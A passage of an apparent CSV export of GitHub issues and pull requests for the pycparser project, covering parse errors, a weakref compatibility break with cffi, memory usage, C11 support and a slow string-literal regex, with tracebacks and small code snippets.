",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/81/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/81/comments,https://api.github.com/repos/eliben/pycparser/issues/81/events,https://github.com/eliben/pycparser/issues/81,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/80,73338521,MDU6SXNzdWU3MzMzODUyMQ==,80,Slow parse using python ConfigParser and requests,1826181,closed,FALSE,NA,NA,1,2015-05-05T14:59:26Z,2016-03-19T12:27:18Z,2016-03-19T12:27:11Z,NONE,NA,"I wrote a simple script in Python that read a config file (a ini format) and then using request library to make an HTTP request to my server.

When i'm using it on my Raspberry Pi i noticed a strange behavior: when i'm using ConfigParser and request libraries together Python have a strange delay into interpreting my script. If i comment the line that require ""requests"" all works correctly.

So i created a simple test file to debug this:

```
$ cat test2.py
import socket
from socket import error as socket_error

import requests

import time

from ConfigParser import SafeConfigParser
```

Linux time command on this code:

```
$ time python test2.py
real    0m21.763s
user    0m21.260s
sys     0m0.300s
```

If i will comment out ""requests"" require, this is the output:

```
$ time python test2.py
real    0m0.373s
user    0m0.300s
sys     0m0.070s
```

Library version:

```
$ pip show requests

---
Metadata-Version: 2.0
Name: requests
Version: 2.7.0
Summary: Python HTTP for Humans.
Home-page: http://python-requests.org
Author: Kenneth Reitz
Author-email: me@kennethreitz.com
License: Apache 2.0
Location: /usr/local/lib/python2.7/dist-packages
Requires:

$ pip show ConfigParser

---
Metadata-Version: 1.1
Name: configparser
Version: 3.3.0.post2
Summary: This library brings the updated configparser from Python 3.2+ to Python 2.6-2.7.
Home-page: http://docs.python.org/3/library/configparser.html
Author: Łukasz Langa
Author-email: lukasz@langa.pl
License: MIT
Location: /usr/local/lib/python2.7/dist-packages
Requires:

$ pip show pycparser

---
Metadata-Version: 1.1
Name: pycparser
Version: 2.12
Summary: C parser in Python
Home-page: https://github.com/eliben/pycparser
Author: Eli Bendersky
Author-email: eliben@gmail.com
License: BSD
Location: /usr/local/lib/python2.7/dist-packages
Requires:

$ python --version
Python 2.7.3
```

This is the output of ""python -v test2.py""

```
[...]
# /usr/lib/python2.7/pickle.pyc matches /usr/lib/python2.7/pickle.py
import pickle # precompiled from /usr/lib/python2.7/pickle.pyc
import marshal # builtin
# /usr/local/lib/python2.7/dist-packages/pycparser/c_parser.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py
import pycparser.c_parser # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/c_parser.pyc
import pycparser.ply # directory /usr/local/lib/python2.7/dist-packages/pycparser/ply
# /usr/local/lib/python2.7/dist-packages/pycparser/ply/__init__.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/ply/__init__.py
import pycparser.ply # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/ply/__init__.pyc
# /usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py
import pycparser.ply.yacc # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.pyc
# /usr/local/lib/python2.7/dist-packages/pycparser/c_ast.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/c_ast.py
import pycparser.c_ast # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/c_ast.pyc
# /usr/local/lib/python2.7/dist-packages/pycparser/c_lexer.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/c_lexer.py
import pycparser.c_lexer # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/c_lexer.pyc
# /usr/local/lib/python2.7/dist-packages/pycparser/ply/lex.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/ply/lex.py
import pycparser.ply.lex # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/ply/lex.pyc
# /usr/lib/python2.7/copy.pyc matches /usr/lib/python2.7/copy.py
import copy # precompiled from /usr/lib/python2.7/copy.pyc
# /usr/local/lib/python2.7/dist-packages/pycparser/plyparser.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/plyparser.py
import pycparser.plyparser # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/plyparser.pyc
# /usr/local/lib/python2.7/dist-packages/pycparser/ast_transforms.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/ast_transforms.py
import pycparser.ast_transforms # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/ast_transforms.pyc
dlopen(""/usr/local/lib/python2.7/dist-packages/_cffi_backend.so"", 2);
import _cffi_backend # dynamically loaded from /usr/local/lib/python2.7/dist-packages/_cffi_backend.so
# /usr/local/lib/python2.7/dist-packages/pycparser/lextab.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/lextab.py
import pycparser.lextab # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/lextab.pyc
# /usr/lib/python2.7/encodings/latin_1.pyc matches /usr/lib/python2.7/encodings/latin_1.py
import encodings.latin_1 # precompiled from /usr/lib/python2.7/encodings/latin_1.pyc
# /usr/local/lib/python2.7/dist-packages/pycparser/yacctab.pyc matches /usr/local/lib/python2.7/dist-packages/pycparser/yacctab.py
import pycparser.yacctab # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/yacctab.pyc
[...]
```

Python interpreter hang some second to last lines of previuos output

```
import pycparser.yacctab # precompiled from /usr/local/lib/python2.7/dist-packages/pycparser/yacctab.pyc
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/80/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/80/comments,https://api.github.com/repos/eliben/pycparser/issues/80/events,https://github.com/eliben/pycparser/issues/80,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/79,71502717,MDExOlB1bGxSZXF1ZXN0MzQyMzgwOTQ=,79,RFC: Allow empty declarations.,1935483,closed,FALSE,NA,NA,3,2015-04-28T06:50:43Z,2015-05-10T14:57:30Z,2015-05-10T14:57:30Z,CONTRIBUTOR,NA,"I've been needing to parse empty declarations, however I am not sure of the correct way to implement this. The code in this pull request allows it to be parsed, but the output may not be 'correct'.

This is for statements like:
- int abc[3] = {}

Thanks in advance for the review.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/79/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/79/comments,https://api.github.com/repos/eliben/pycparser/issues/79/events,https://github.com/eliben/pycparser/pull/79,https://api.github.com/repos/eliben/pycparser/pulls/79
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/78,70017074,MDExOlB1bGxSZXF1ZXN0MzM4MjQ2ODE=,78,Add a functional test,108448,closed,FALSE,NA,NA,2,2015-04-22T04:11:24Z,2016-02-29T14:08:55Z,2016-02-29T14:08:55Z,NONE,NA,"Although consumers of pycparser should probably check they don't break
with new versions before relying on them, it would be nice if
pycparser also did a little sanity checking of arguably it's main
consumer; the cryptography->cffi->pycparser dependency chain.

This does a quick install and runs the cryptography tests; enough to
ensure there's no huge breakage.

(travis fails on the 3.2 build as idna isn't compatible with Python
3.2 due to it using u""foo"")
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/78/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/78/comments,https://api.github.com/repos/eliben/pycparser/issues/78/events,https://github.com/eliben/pycparser/pull/78,https://api.github.com/repos/eliben/pycparser/pulls/78
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/77,69982456,MDExOlB1bGxSZXF1ZXN0MzM4MTUyMjg=,77,add weakref to c_ast.Node abstract base class; closes #75 and #76,704247,closed,FALSE,NA,NA,4,2015-04-22T00:02:33Z,2015-04-22T00:21:28Z,2015-04-22T00:06:32Z,NONE,NA,"This pull request ensures that `c_ast.Node` subclasses can have `weakref`s by adding `__weakref__`.

It should make cffi work with pycparser again.

Included is one minimal ""canary"" sanity test.  I would be happy to add additional tests if you'd like.

Thanks!
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/77/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/77/comments,https://api.github.com/repos/eliben/pycparser/issues/77/events,https://github.com/eliben/pycparser/pull/77,https://api.github.com/repos/eliben/pycparser/pulls/77
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/76,69973292,MDU6SXNzdWU2OTk3MzI5Mg==,76,Support for Weakref in __slots__,4999882,closed,FALSE,NA,NA,11,2015-04-21T23:03:54Z,2015-04-22T00:53:01Z,2015-04-22T00:25:34Z,NONE,NA,"Hello,
I see you added support for the **slots** mechanism in the ast. Nice. However, this breaks cffi downstream, since they use weak references to Enum, etc objects (see their cparser.py file). In turn this breaks petlib which I maintain.
I think the solution is to include the ""**weakref**"" in the ""**slots**"" list of fields, as per the advice at:
https://docs.python.org/2/reference/datamodel.html#slots
Many thanks,
George
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/76/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/76/comments,https://api.github.com/repos/eliben/pycparser/issues/76/events,https://github.com/eliben/pycparser/issues/76,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/75,69972342,MDU6SXNzdWU2OTk3MjM0Mg==,75,version 2.11 incompatible with cryptography 0.8.2,549519,closed,FALSE,NA,NA,2,2015-04-21T22:57:34Z,2015-04-22T00:06:55Z,2015-04-22T00:06:55Z,NONE,NA,"Our build started failing just after the release, here are the relevant lines from the log:

> 14:49:17 Collecting cryptography>=0.7 (from pyOpenSSL->pysaml2==2.4.0->-r requirements.txt (line 32))
> 14:49:17   Using cached cryptography-0.8.2.tar.gz
> 
> 14:49:18 Collecting pycparser (from cffi>=0.8->cryptography>=0.7->pyOpenSSL->pysaml2==2.4.0->-r requirements.txt (line 32))
> 14:49:18   Downloading pycparser-2.11.tar.gz (297kB)
> 
> 14:49:43   Running setup.py install for cryptography
> 14:49:43     Complete output from command /mnt_ram/jenkins_jobs/Apps-deploy/jenkins-Apps-deploy-810/bin/python2.7 -c ""import setuptools, tokenize;**file**='/tmp/pip-build-dNQhaD/cryptography/setup.py';exec(compile(getattr(tokenize, 'open', open)(**file**).read().replace('\r\n', '\n'), **file**, 'exec'))"" install --record /tmp/pip-tfy0go-record/install-record.txt --single-version-externally-managed --compile --install-headers /mnt_ram/jenkins_jobs/Apps-deploy/jenkins-Apps-deploy-810/include/site/python2.7/cryptography:
> 14:49:43     running install
> 14:49:43     Traceback (most recent call last):
> 14:49:43       File ""<string>"", line 1, in <module>
> 14:49:43       File ""/tmp/pip-build-dNQhaD/cryptography/setup.py"", line 342, in <module>
> 14:49:43         **keywords_with_side_effects(sys.argv)
> 14:49:43       File ""/usr/lib/python2.7/distutils/core.py"", line 151, in setup
> 14:49:43         dist.run_commands()
> 14:49:43       File ""/usr/lib/python2.7/distutils/dist.py"", line 953, in run_commands
> 14:49:43         self.run_command(cmd)
> 14:49:43       File ""/usr/lib/python2.7/distutils/dist.py"", line 971, in run_command
> 14:49:43         cmd_obj.ensure_finalized()
> 14:49:43       File ""/usr/lib/python2.7/distutils/cmd.py"", line 109, in ensure_finalized
> 14:49:43         self.finalize_options()
> 14:49:43       File ""/tmp/pip-build-dNQhaD/cryptography/setup.py"", line 119, in finalize_options
> 14:49:43         self.distribution.ext_modules = get_ext_modules()
> 14:49:43       File ""/tmp/pip-build-dNQhaD/cryptography/setup.py"", line 78, in get_ext_modules
> 14:49:43         from cryptography.hazmat.bindings.commoncrypto.binding import (
> 14:49:43       File ""/tmp/pip-build-dNQhaD/cryptography/src/cryptography/hazmat/bindings/commoncrypto/binding.py"", line 14, in <module>
> 14:49:43         class Binding(object):
> 14:49:43       File ""/tmp/pip-build-dNQhaD/cryptography/src/cryptography/hazmat/bindings/commoncrypto/binding.py"", line 36, in Binding
> 14:49:43         ""-framework"", ""Security"", ""-framework"", ""CoreFoundation""
> 14:49:43       File ""/tmp/pip-build-dNQhaD/cryptography/src/cryptography/hazmat/bindings/utils.py"", line 97, in build_ffi_for_binding
> 14:49:43         extra_link_args=extra_link_args,
> 14:49:43       File ""/tmp/pip-build-dNQhaD/cryptography/src/cryptography/hazmat/bindings/utils.py"", line 106, in build_ffi
> 14:49:43         ffi.cdef(cdef_source)
> 14:49:43       File ""/mnt_ram/jenkins_jobs/Apps-deploy/jenkins-Apps-deploy-810/local/lib/python2.7/site-packages/cffi/api.py"", line 106, in cdef
> 14:49:43         self._parser.parse(csource, override=override, packed=packed)
> 14:49:43       File ""/mnt_ram/jenkins_jobs/Apps-deploy/jenkins-Apps-deploy-810/local/lib/python2.7/site-packages/cffi/cparser.py"", line 165, in parse
> 14:49:43         self._internal_parse(csource)
> 14:49:43       File ""/mnt_ram/jenkins_jobs/Apps-deploy/jenkins-Apps-deploy-810/local/lib/python2.7/site-packages/cffi/cparser.py"", line 199, in _internal_parse
> 14:49:43         realtype = self._get_type(decl.type, name=decl.name)
> 14:49:43       File ""/mnt_ram/jenkins_jobs/Apps-deploy/jenkins-Apps-deploy-810/local/lib/python2.7/site-packages/cffi/cparser.py"", line 360, in _get_type
> 14:49:43         return self._get_struct_union_enum_type('struct', type, name)
> 14:49:43       File ""/mnt_ram/jenkins_jobs/Apps-deploy/jenkins-Apps-deploy-810/local/lib/python2.7/site-packages/cffi/cparser.py"", line 434, in _get_struct_union_enum_type
> 14:49:43         return self._structnode2type[type]
> 14:49:43       File ""/usr/lib/python2.7/weakref.py"", line 315, in __getitem__
> 14:49:43         return self.data[ref(key)]
> 14:49:43     TypeError: cannot create weak reference to 'Struct' object
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/75/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/75/comments,https://api.github.com/repos/eliben/pycparser/issues/75/events,https://github.com/eliben/pycparser/issues/75,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/74,69408062,MDExOlB1bGxSZXF1ZXN0MzM2MTY0ODY=,74,Allow binary constants (e.g.: 0b01010),1935483,closed,FALSE,NA,NA,1,2015-04-19T10:11:57Z,2015-04-20T12:02:15Z,2015-04-20T12:02:15Z,CONTRIBUTOR,NA,"Here is a small patch to allow binary constants (like the existing octal and hex constants)
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/74/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/74/comments,https://api.github.com/repos/eliben/pycparser/issues/74/events,https://github.com/eliben/pycparser/pull/74,https://api.github.com/repos/eliben/pycparser/pulls/74
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/73,65325366,MDU6SXNzdWU2NTMyNTM2Ng==,73,PyCParser Parsing error on __attribute__ ((,10137,closed,FALSE,NA,NA,3,2015-03-30T23:12:52Z,2015-04-18T13:11:13Z,2015-04-18T13:11:13Z,NONE,NA,"Eli,

I am trying to use pycparser to do static testing on embedded C. I am using pycparser v2.10.

The target code can be compiled by gcc and a cpp @ccargs.txt i2cm_5410x.c (testing against a master i2c driver) seems to be OK. I have created a configuration file which seems to be working fine (ccargs.txt). In it, I have the include files and defines that are required to compile the module.  All this seems to be working fine.

When I run my modified version of cpp_libc.py, I receive a parsing error. Here is the traceback.

Traceback (most recent call last):
  File ""cpp_libc.py"", line 27, in <module>
    cpp_args=r'@ccargs.txt')
  File ""build\bdist.win32\egg\pycparser__init__.py"", line 93, in parse_file
  File ""build\bdist.win32\egg\pycparser\c_parser.py"", line 138, in parse
  File ""build\bdist.win32\egg\pycparser\ply\yacc.py"", line 265, in parse
  File ""build\bdist.win32\egg\pycparser\ply\yacc.py"", line 1047, in parseopt_notrack
  File ""build\bdist.win32\egg\pycparser\c_parser.py"", line 1613, in p_error
  File ""build\bdist.win32\egg\pycparser\plyparser.py"", line 54, in _parse_error
pycparser.plyparser.ParseError: ../inc/core_cmInstr.h:325:16: before: (

The  function it is complaining about is this:
**attribute**( ( always_inline ) ) __STATIC_INLINE void __NOP(void)
{
  __ASM volatile (""nop"");
}

Specifically, the first line (**attribute**) at the second open ""(""... Any idea what may be causing this?

Thanks,

ACV
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/73/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/73/comments,https://api.github.com/repos/eliben/pycparser/issues/73/events,https://github.com/eliben/pycparser/issues/73,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/72,65320585,MDU6SXNzdWU2NTMyMDU4NQ==,72,pycparser increases memory usage of pyOpenSSL by an order of magnitue,108448,closed,FALSE,NA,NA,10,2015-03-30T22:47:35Z,2015-05-10T14:58:23Z,2015-05-10T14:58:23Z,NONE,NA,"I have opened https://github.com/pyca/pyopenssl/issues/202 which shows the rewrite of pyOpenSSL from C bindings to it's current usage of ""cryptography"" (the package) between 0.13 & 0.14 has increased memory usage by an order of magnitude from ~2mb to ~20mb

The issue was debugged from issues with openstack ci jobs running out of memory in [1]

As described there, heapy showed the top heap usage as

```
Partition of a set of 205366 objects. Total size = 30969040 bytes.
 Index  Count   %     Size   % Cumulative  % Kind (class / dict of class)
     0  67041  33  5712560  18   5712560  18 str
     1  10260   5  2872800   9   8585360  28 dict of pycparser.plyparser.Coord
     2  27765  14  2367552   8  10952912  35 tuple
     3   1215   1  2246760   7  13199672  43 dict (no owner)
     4   1882   1  1972336   6  15172008  49 dict of pycparser.c_ast.Decl
     5  16085   8  1736232   6  16908240  55 list
     6    360   0  1135296   4  18043536  58 dict of module
     7   4041   2  1131480   4  19175016  62 dict of pycparser.c_ast.TypeDecl
     8   4021   2  1125880   4  20300896  66 dict of pycparser.c_ast.IdentifierType
     9   6984   3   893952   3  21194848  68 types.CodeType
<413 more rows. Type e.g. '_.more' to view.>
```

which seems to indicate pycparser as pretty uch the top consumer.  Of course there are many layers here -- pyOpenSSL -> cryptography -> cffi -> pycparser

I am not sure if something is tickling a bug in pycparser and causing leakage, or if this is just expected usage.  The increase is rather dramatic however.

I understand this isn't a great bug report.  I haven't a regression point where things suddenly started using more memory and it may be something one of the upper layers is doing wrong.

[1] https://etherpad.openstack.org/p/oom-in-rax-centos7-CI-job
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/72/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/72/comments,https://api.github.com/repos/eliben/pycparser/issues/72/events,https://github.com/eliben/pycparser/issues/72,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/71,59954235,MDU6SXNzdWU1OTk1NDIzNQ==,71,Parse not work with FILE pointer,5894606,closed,FALSE,NA,NA,4,2015-03-05T13:54:16Z,2015-03-06T03:32:22Z,2015-03-06T03:32:22Z,NONE,NA,"Hello!
I'm using pycparser to generate the symbol tree in an IDE. The problem is when used the FILE pointer. For example:

``` python
code = """"""
FILE * fp;
void foo( void ) {
return;
}
""""""

parser = c_parser.CParser()
ast = parser.parse(code)
```

traceback

```
ParseError: :2:6: before: *
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/71/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/71/comments,https://api.github.com/repos/eliben/pycparser/issues/71/events,https://github.com/eliben/pycparser/issues/71,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/70,58582126,MDU6SXNzdWU1ODU4MjEyNg==,70,Add sys/socket.h support to fakelib,5333485,closed,FALSE,NA,NA,2,2015-02-23T12:57:25Z,2015-05-10T14:58:51Z,2015-05-10T14:58:51Z,NONE,NA,"As said in the title, it'd be very useful to get sys/socket.h support to fakelib. 

Is there any way I can overcome this issue in the meantime?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/70/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/70/comments,https://api.github.com/repos/eliben/pycparser/issues/70/events,https://github.com/eliben/pycparser/issues/70,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/69,57876958,MDExOlB1bGxSZXF1ZXN0Mjk0MTQ0MzU=,69,adds visit_FuncDecl method to CGenerator,734386,closed,FALSE,NA,NA,5,2015-02-17T02:42:56Z,2015-02-21T17:30:06Z,2015-02-21T17:27:49Z,CONTRIBUTOR,NA,NA,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/69/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/69/comments,https://api.github.com/repos/eliben/pycparser/issues/69/events,https://github.com/eliben/pycparser/pull/69,https://api.github.com/repos/eliben/pycparser/pulls/69
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/68,56181599,MDU6SXNzdWU1NjE4MTU5OQ==,68,"parsing ""const char* const*"" generates ""const char ** const""",2626530,closed,FALSE,NA,NA,3,2015-02-01T22:39:15Z,2015-04-20T14:17:32Z,2015-04-20T14:17:32Z,NONE,NA,"Heyho,

I use pycparser to automatically implement a given inteface with stub functions. One function takes a const char\* const\* argument and after parsing this declaration, appending the body and generating it with defaults, I get a const char *\* const argument in my implementation. This leads to a ""warning: assignment from incompatible pointer type"" from gcc.

I have two cases leading to this warning:
parsed -> generated
const char\* const\* arg -> const char *\* const arg
struct bla\* const\* arg -> struct bla *\* const arg

--schachmat
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/68/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/68/comments,https://api.github.com/repos/eliben/pycparser/issues/68/events,https://github.com/eliben/pycparser/issues/68,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/67,53017160,MDU6SXNzdWU1MzAxNzE2MA==,67,Dump AST of a C file as a JSON string,1478660,closed,FALSE,NA,NA,3,2014-12-29T03:03:33Z,2015-04-18T14:09:59Z,2015-04-18T14:09:59Z,NONE,NA,"Thanks Eli for writing this module.  Wonder if it's possible to dump ast of a C file in a JSON form?
It would be easier to apply some customized instrument.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/67/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/67/comments,https://api.github.com/repos/eliben/pycparser/issues/67/events,https://github.com/eliben/pycparser/issues/67,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/66,52964166,MDU6SXNzdWU1Mjk2NDE2Ng==,66,Parsing an empty struct causes an error,10137,closed,FALSE,NA,NA,4,2014-12-27T19:34:14Z,2014-12-28T19:42:30Z,2014-12-28T19:42:30Z,NONE,NA,"Hello,

I'm using pycparser to parse a C file that is automatically generated from some other tool. Pycparser generates an parseError when it parses an empty struct. The code to be parsed is as follows:

``` c
/* a.c */
struct Foo {
};
```

The python file (parse.py) I ran was the following:

``` python
#!/usr/bin/python
from pycparser import parse_file
ast = parse_file(r'a.c', use_cpp=True)
```

The error trace is the following:

```
Traceback (most recent call last):
File ""./parse.py"", line 3, in 
ast = parse_file(r'a.c', use_cpp=True)
File ""/Users/zilong/pycparser/pycparser/init.py"", line 93, in parse_file
return parser.parse(text, filename)
File ""/Users/zilong/pycparser/pycparser/c_parser.py"", line 138, in parse
debug=debuglevel)
File ""/Users/zilong/pycparser/pycparser/ply/yacc.py"", line 265, in parse
return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
File ""/Users/zilong/pycparser/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
tok = self.errorfunc(errtoken)
File ""/Users/zilong/pycparser/pycparser/c_parser.py"", line 1631, in p_error
column=self.clex.find_tok_column(p)))
File ""/Users/zilong/pycparser/pycparser/plyparser.py"", line 54, in _parse_error
raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: a.c:2:1: before: }
```

It would be great if you could point out to me how to fix it. Thanks a lot.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/66/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/66/comments,https://api.github.com/repos/eliben/pycparser/issues/66/events,https://github.com/eliben/pycparser/issues/66,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/65,52964035,MDU6SXNzdWU1Mjk2NDAzNQ==,65,Parsing an empty struct causes an error,10137,closed,FALSE,NA,NA,0,2014-12-27T19:27:37Z,2014-12-27T19:30:17Z,2014-12-27T19:30:17Z,NONE,NA,"Hello,

I'm using pycparser to parse a C file that is automatically generated from some other tool. Pycparser generates an parseError when it parses an empty struct. The code to be parsed is as follows:

============= a.c ================
struct Foo {
# };

The python file I ran was the following:
=========== parse.py =============
# !/usr/bin/python

from pycparser import parse_file
# ast = parse_file(r'a.c', use_cpp=True)
# The error trace is the following:

Traceback (most recent call last):
  File ""./parse.py"", line 3, in <module>
    ast = parse_file(r'a.c', use_cpp=True)
  File ""/Users/zilong/pycparser/pycparser/**init**.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/Users/zilong/pycparser/pycparser/c_parser.py"", line 138, in parse
    debug=debuglevel)
  File ""/Users/zilong/pycparser/pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/Users/zilong/pycparser/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/Users/zilong/pycparser/pycparser/c_parser.py"", line 1631, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/Users/zilong/pycparser/pycparser/plyparser.py"", line 54, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
# pycparser.plyparser.ParseError: a.c:2:1: before: }

It would be great if you could point out to me how to fix it. Thanks a lot.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/65/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/65/comments,https://api.github.com/repos/eliben/pycparser/issues/65/events,https://github.com/eliben/pycparser/issues/65,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/64,52538615,MDExOlB1bGxSZXF1ZXN0MjY0MDUxOTA=,64,Update array dimension grammar,3278746,closed,FALSE,NA,NA,4,2014-12-19T23:04:02Z,2015-01-19T01:58:35Z,2015-01-17T14:33:28Z,NONE,NA,"These changes update the pycparser grammar to align with C grammar to now allow parsing of constructs like
int f[restrict][5];
which is an example in the draft standard I consulted, and some other valid constructs as well.
I think these constructs are C99, not C11, as I consulted a draft standard numbered 1256 which didn't seem to mention C11 additions like _Generic.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/64/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/64/comments,https://api.github.com/repos/eliben/pycparser/issues/64/events,https://github.com/eliben/pycparser/pull/64,https://api.github.com/repos/eliben/pycparser/pulls/64
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/63,52322069,MDU6SXNzdWU1MjMyMjA2OQ==,63,C11 support?,1690697,open,FALSE,NA,NA,1,2014-12-18T03:33:53Z,2016-10-06T14:03:01Z,NA,NONE,NA,"Are there any plans for pycparser to support C11, most particularly _Generic, _Static_assert, and _Noreturn?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/63/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/63/comments,https://api.github.com/repos/eliben/pycparser/issues/63/events,https://github.com/eliben/pycparser/issues/63,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/62,52296513,MDU6SXNzdWU1MjI5NjUxMw==,62,Parse error when parsing function declaration,3278746,closed,FALSE,NA,NA,2,2014-12-17T21:50:54Z,2015-01-19T01:56:07Z,2015-01-19T01:56:07Z,NONE,NA,"When parsing a function declaration like
void f(double a[restrict][5]);
pycparser emits a parsing error.  The above example was copied from section 6.7.5.3 (function declarators) of the C standard.  I guess the error is due to pycparser not recognizing the restrict keyword in the array declaration.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/62/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/62/comments,https://api.github.com/repos/eliben/pycparser/issues/62/events,https://github.com/eliben/pycparser/issues/62,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/61,48435832,MDU6SXNzdWU0ODQzNTgzMg==,61,String literals with many escapes take a long time to tokenize,5603695,closed,FALSE,NA,NA,4,2014-11-11T21:16:16Z,2019-08-26T21:18:39Z,2019-08-26T21:18:39Z,NONE,NA,"Running the following program on the following data takes a long time to parse.

``` python
if __name__ == '__main__':
    ast = pycparser.parse_file(""x.c"")
    ast.show()
```

``` c
int main(int argc, char** argv) {
    ""\123\123\123\123\123\123\123\123\123\123\123\123\123\123\123"";
}
```

I think the problem is that the BAD_STRING_LITERAL regular expression is doing backtracking, resulting in exponential running time. Add another '\123' to the string and it will take roughly 3 times as long.

If I break the BAD_STRING_LITERAL pattern, by requiring that it start with some unexpected string `'xyzzy and then some'` so that it never starts to match, the program runs quickly.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/61/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/61/comments,https://api.github.com/repos/eliben/pycparser/issues/61/events,https://github.com/eliben/pycparser/issues/61,NA
